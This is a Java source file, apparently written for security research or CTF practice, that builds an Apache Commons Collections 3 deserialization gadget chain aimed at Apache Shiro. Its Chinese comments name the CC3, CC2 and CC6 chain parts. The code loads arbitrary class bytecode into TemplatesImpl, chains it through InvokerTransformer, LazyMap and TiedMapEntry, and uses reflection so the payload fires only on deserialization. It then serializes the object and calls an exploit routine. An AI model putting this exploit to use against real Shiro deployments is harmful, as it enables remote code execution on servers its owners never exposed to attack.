

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

/**
 * commons-collections3的版本打法
 */
public class ShiroCC {
    public static void main(String[] args) throws Exception {

//        CC3
        TemplatesImpl templates = new TemplatesImpl();

        Class c = templates.getClass();
        Field fieldName = c.getDeclaredField("_name");
//        为了满足if判断逻辑
        fieldName.setAccessible(true);
        fieldName.set(templates,"aaa");
//         获取字节码属性
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);

//        获取字节码
        byte[] code = Files.readAllBytes(Paths.get("D://tmp/classes/Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

//        CC2
        Transformer invokerTransformer = new InvokerTransformer("newTransformer",null,null);

//        CC6
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazy = LazyMap.decorate(map, invokerTransformer);

//        传入key为templates，在LazyMap.get时，可以成功调用
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy,templates );

        HashMap<Object, Object> map2 =  new HashMap<>();


//      类似URLDNS那条链，先不填充，put后再填充，以便序列化时不触发，反序列化时触发
        Class aClass = tiedMapEntry.getClass();
        Field declaredField = aClass.getDeclaredField("map");
        declaredField.setAccessible(true);
        declaredField.set(tiedMapEntry,new HashMap<>());

        map2.put(tiedMapEntry, "bbb");

        declaredField.set(tiedMapEntry,lazy);

        Utils.serialize(map2);
        Utils.EXP();

    }
}
